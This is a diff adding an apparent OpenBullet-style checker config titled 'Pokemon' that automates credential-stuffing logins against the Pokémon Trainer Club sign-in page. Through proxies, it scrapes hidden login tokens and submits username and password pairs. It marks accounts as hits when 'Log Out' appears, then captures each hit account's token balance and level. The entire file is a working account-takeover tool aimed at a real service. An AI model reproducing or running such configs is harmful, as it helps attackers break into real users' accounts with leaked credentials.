@@ -1,0 +1,79 @@
+[SETTINGS]
+{
+  "Name": "Pokemon",
+  "SuggestedBots": 1,
+  "LastModified": "2018-05-30T03:00:19.5176592+00:00",
+  "AdditionalInfo": "",
+  "Author": "MaStErChO",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST GET "https://sso.pokemon.com/sso/login?locale=en&service=https://club.pokemon.com/us/pokemon-trainer-club/caslogin" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0." 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "referer: https://sso.pokemon.com/sso/login?locale=en&service=https://club.pokemon.com/us/pokemon-trainer-club/caslogin" 
+PARSE "<SOURCE>" LR "type=\"hidden\" name=\"lt\" value=\"" "\"" Recursive=FALSE -> VAR "TOKEN" "" "" 
+PARSE "<SOURCE>" LR "type=\"hidden\" name=\"execution\" value=\"" "\"" Recursive=FALSE -> VAR "EXEC" "" "" 
+REQUEST POST "https://sso.pokemon.com/sso/login?locale=en&service=https://club.pokemon.com/us/pokemon-trainer-club/caslogin" AutoRedirect=TRUE 
+  CONTENT "lt=<TOKEN>&execution=<EXEC>&_eventId=submit&username=<USER>&password=<PASS>&Login=Sign+In" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  COOKIE "_c: 1" 
+  COOKIE "com.pokemon.cas.web.servlet.i18n.CustomLocaleResolver.LOCALE: en" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "Your username or password is incorrect" 
+  KEYCHAIN Success OR 
+    KEY "Log Out" 
+REQUEST GET "https://www.pokemon.com/us/pokemon-trainer-club/my-profile/" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept:  text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#PARSE_SESS PARSE "<COOKIES(op_session_id)>" LR "" "" Recursive=FALSE -> VAR "SESSION" "" "" 
+FUNCTION CurrentUnixTime "" -> VAR "TIME" 
+REQUEST GET "https://www.pokemon.com/api/users/details?_=<TIME>" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  COOKIE "_c: 1" 
+  COOKIE "django_language: en" 
+  COOKIE "op_session_id: <SESSION>" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "X-NewRelic-ID: VQ4OWFZXGwIAXFZTBgI=" 
+  HEADER "X-Referer: /us/pokedex/" 
+#PARSE_LEVEL PARSE "<SOURCE>" LR "\"level\":" "," Recursive=FALSE -> CAP "Level" "" "" 
+PARSE "<SOURCE>" LR "tokenBalance\":" "," Recursive=FALSE -> CAP "Tokens" "" "" 
+REQUEST GET "https://www.pokemon.com/us/play-pokemon/leaderboards/tcgo/api/overall/?leaderboard_type=play&leaderboard_when=LastCurrentSeason&leaderboard_who=&per_page=25&page=1&include=metadata&format=json" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "sign-in-rank" 
+  KEYCHAIN Success OR 
+    KEY "<SOURCE>" DoesNotContain "sign-in-rank" 
